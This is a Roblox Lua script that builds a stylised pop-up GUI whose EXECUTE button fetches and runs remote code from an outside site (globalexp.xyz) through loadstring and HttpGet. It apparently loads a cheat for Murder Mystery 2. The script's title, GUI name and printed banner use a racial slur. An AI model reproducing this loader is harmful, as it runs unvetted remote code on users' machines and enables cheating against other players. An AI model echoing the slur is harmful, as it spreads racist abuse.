-- LIGHTNING NIGGA V1.4
-- Press F → One giant EXECUTE button → Instantly runs Mm2 GlobalExp
-- New background: rbxassetid://134677154131329 (your requested one)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

-- Sounds
local execSound = Instance.new("Sound", SoundService)
execSound.SoundId = "rbxassetid://12222019"
execSound.Volume = 0.6

local clickSound = Instance.new("Sound", SoundService)
clickSound.SoundId = "rbxassetid://12222030"
clickSound.Volume = 0.7

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "LightningNigga"
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999999
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 460, 0, 560)
main.Position = UDim2.new(0.5, -230, 0.5, -280)
main.BackgroundTransparency = 1          -- fully transparent so background shows
main.Visible = false
main.ClipsDescendants = true
main.Parent = gui

-- NEW Background (your exact ID)
local background = Instance.new("ImageLabel", main)
background.Size = UDim2.new(1,0,1,0)
background.Image = "rbxassetid://134677154131329"
background.ScaleType = Enum.ScaleType.Crop      -- looks perfect with this ID
background.BackgroundTransparency = 1
background.ZIndex = 0

-- Rounded corners + purple stroke
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)
local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 4
stroke.Color = Color3.fromRGB(180, 70, 255)
stroke.Transparency = 0.35

-- Top Bar
local topBar = Instance.new("Frame", main)
topBar.Size = UDim2.new(1,0,0,50)
topBar.BackgroundTransparency = 1

local title = Instance.new("TextLabel", topBar)
title.Size = UDim2.new(1,-100,1,0)
title.Position = UDim2.new(0,20,0,0)
title.BackgroundTransparency = 1
title.Text = "LIGHTNING NIGGA V1.4"
title.TextColor3 = Color3.fromRGB(220, 120, 255)
title.Font = Enum.Font.Code
title.TextSize = 28
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(140, 0, 255)
title.TextXAlignment = "Left"

-- Normal X close button
local closeBtn = Instance.new("TextButton", topBar)
closeBtn.Size = UDim2.new(0,50,0,50)
closeBtn.Position = UDim2.new(1,-50,0,0)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 100, 200)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 30

-- EXECUTE BUTTON
local execute = Instance.new("TextButton")
execute.Size = UDim2.new(0, 380, 0, 100)
execute.Position = UDim2.new(0.5, -190, 0.5, -80)
execute.BackgroundColor3 = Color3.fromRGB(100, 0, 200)
execute.Text = "EXECUTE"
execute.TextColor3 = Color3.new(1,1,1)
execute.Font = Enum.Font.SciFi
execute.TextSize = 48
execute.TextStrokeTransparency = 0
execute.TextStrokeColor3 = Color3.fromRGB(0, 255, 255)
execute.ZIndex = 5
execute.Parent = main

Instance.new("UICorner", execute).CornerRadius = UDim.new(0, 16)
local eStroke = Instance.new("UIStroke", execute)
eStroke.Thickness = 5
eStroke.Color = Color3.fromRGB(170, 0, 255)
eStroke.Transparency = 0.3

-- Hover glow
execute.MouseEnter:Connect(function()
    TweenService:Create(execute, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(170, 0, 255)}):Play()
    TweenService:Create(eStroke, TweenInfo.new(0.3), {Transparency = 0}):Play()
end)
execute.MouseLeave:Connect(function()
    TweenService:Create(execute, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100, 0, 200)}):Play()
    TweenService:Create(eStroke, TweenInfo.new(0.3), {Transparency = 0.3}):Play()
end)

-- REAL EXECUTE
execute.MouseButton1Click:Connect(function()
    clickSound:Play()
    loadstring(game:HttpGet("https://globalexp.xyz/Mm22"))()
end)

-- Draggable
local dragging = false
topBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        local startPos = input.Position
        local origPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
        topBar.InputChanged:Connect(function(input2)
            if dragging and input2.UserInputType == Enum.UserInputType.MouseMovement then
                local delta = input2.Position - startPos
                main.Position = UDim2.new(origPos.X.Scale, origPos.X.Offset + delta.X,
                                         origPos.Y.Scale, origPos.Y.Offset + delta.Y)
            end
        end)
    end
end)

-- Toggle with F
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.F then
        main.Visible = not main.Visible
        if main.Visible then
            execSound:Play()
            main.Size = UDim2.new(0,0,0,0)
            TweenService:Create(main, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                {Size = UDim2.new(0,460,0,560)}):Play()
        end
    end
end)

closeBtn.MouseButton1Click:Connect(function()
    main.Visible = false
end)

print("LIGHTNING NIGGA V1.4 LOADED | Background updated | Press F")
